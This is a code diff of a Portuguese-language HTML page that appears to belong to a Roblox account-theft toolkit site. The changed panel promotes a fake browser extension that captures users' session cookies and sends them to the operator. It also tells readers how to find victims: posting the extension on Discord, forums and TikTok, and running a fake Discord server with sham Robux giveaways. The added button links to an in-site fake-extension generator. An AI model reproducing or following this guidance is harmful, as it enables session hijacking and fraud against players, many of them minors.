@@ -2722,18 +2722,15 @@
                 <div class="site-list-card" style="background:var(--surface);">
                   <div class="site-list-icon">
                     <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--red-glow)" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
-                      <!-- Chapéu -->
-                      <path d="M9 8 L12 2 L15 8"/>
-                      <line x1="7.5" y1="8" x2="16.5" y2="8"/>
-                      <!-- Rosto -->
-                      <circle cx="12" cy="14" r="7"/>
-                      <!-- Olhos -->
-                      <circle cx="9.5" cy="12.5" r="0.9" fill="var(--red-glow)" stroke="none"/>
-                      <circle cx="14.5" cy="12.5" r="0.9" fill="var(--red-glow)" stroke="none"/>
-                      <!-- Nariz -->
-                      <circle cx="12" cy="14.5" r="1.3"/>
-                      <!-- Sorriso -->
-                      <path d="M9.5 17 Q12 20 14.5 17"/>
+                      <!-- Cookie com mordida no canto superior direito -->
+                      <path d="M16.2 3.5 A9 9 0 1 0 20.5 7.8"/>
+                      <!-- Borda da mordida (ondulada) -->
+                      <path d="M16.2 3.5 Q18 1.5 20 3 Q22 4.5 20.5 7.8"/>
+                      <!-- Chips -->
+                      <circle cx="9" cy="10" r="1" fill="var(--red-glow)" stroke="none"/>
+                      <circle cx="13" cy="14" r="1" fill="var(--red-glow)" stroke="none"/>
+                      <circle cx="8" cy="15" r="1" fill="var(--red-glow)" stroke="none"/>
+                      <circle cx="12" cy="8" r="0.9" fill="var(--red-glow)" stroke="none"/>
                     </svg>
                   </div>
                   <div class="site-list-body">
@@ -2917,21 +2914,20 @@
                         <p style="font-size:.88rem;color:var(--text);margin-bottom:12px;">Uns dos melhores métodos que quase ninguém conhece. Possivelmente sou uma das primeiras, se não o primeiro, a trazer esse método no servidor BR. Esse foi o método que três jovens ucranianos conseguiram <strong style="color:var(--red-glow);">+600 mil contas</strong> — mas no final foram presos. Não é para assustar, estou apenas mostrando o quanto ele é eficiente. Se você não quiser ser preso é só não roubar +600 mil contas; eles foram presos justamente pela alta quantia.</p>
                         <p style="font-size:.88rem;color:var(--text);margin-bottom:12px;">O método consiste em uma extensão que, ao ser adicionada no navegador, <strong style="color:var(--red-glow);">captura o cookie do usuário</strong> e envia para você. A extensão foi desenvolvida por mim com suporte do servidor da Beamse para formatação dos dados capturados. Ela promete hackear uma conta do Roblox, mas com uma limitação: <strong style="color:var(--text);">você precisa ser amigo desse usuário</strong> — isso força a vítima a usar a conta principal.</p>
                         <div style="background:rgba(224,16,42,0.07);border:1px solid rgba(224,16,42,0.2);border-radius:10px;padding:12px 14px;margin-bottom:12px;">
-                          <div style="font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--red-glow);margin-bottom:5px;">📢 Como conseguir vítimas</div>
+                          <div style="font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--red-glow);margin-bottom:5px;">Como conseguir vítimas</div>
                           <p style="font-size:.83rem;color:var(--text-muted);margin:0;">Publique a extensão em <strong style="color:var(--text);">fóruns, servidores de Discord</strong> ou redes sociais como o <strong style="color:var(--text);">TikTok</strong>. Para o TikTok, pesquise por <em>beamed</em>, baixe os vídeos e publique-os.</p>
                         </div>
                         <div style="background:rgba(224,16,42,0.07);border:1px solid rgba(224,16,42,0.2);border-radius:10px;padding:12px 14px;margin-bottom:12px;">
-                          <div style="font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--red-glow);margin-bottom:5px;">🎮 Servidor Discord falso</div>
+                          <div style="font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--red-glow);margin-bottom:5px;">Servidor Discord falso</div>
                           <p style="font-size:.83rem;color:var(--text-muted);margin:0;">Crie um servidor de Discord estilo beaming gringo com canais de anúncios, updates, tutorial-cookie, tutorial-bypass e a extensão fake — usando nomes como <em>Beaming</em> ou <em>Beamed</em>. Faça tutoriais para cada canal. Realize <strong style="color:var(--text);">sorteios falsos</strong> com quantidades enormes de Robux e drops falsos para atrair mais vítimas.</p>
                         </div>
                         <div style="background:rgba(224,16,42,0.07);border:1px solid rgba(224,16,42,0.2);border-radius:10px;padding:12px 14px;">
-                          <div style="font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--red-glow);margin-bottom:5px;">🔧 Como gerar sua extensão</div>
+                          <div style="font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--red-glow);margin-bottom:5px;">Como gerar sua extensão</div>
                           <p style="font-size:.83rem;color:var(--text-muted);margin:0;">Para criar sua extensão vá em <strong style="color:var(--text);">Ferramentas &gt; Extensão Falsa</strong> e assista ao vídeo, ou aperte no botão abaixo para ir direto.</p>
                         </div>
                       </div>
 
-                      <!-- Botão para ferramentas (placeholder) -->
-                      <button class="site-list-btn" style="border:none;cursor:pointer;margin-bottom:18px;">
+                      <button class="site-list-btn" style="border:none;cursor:pointer;margin-bottom:18px;" onclick="closeMethod();showView('ferramentas');document.querySelector('[data-tab='y2']').click();">
                         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
                         <span>Ir para Extensão Falsa</span>
                       </button>
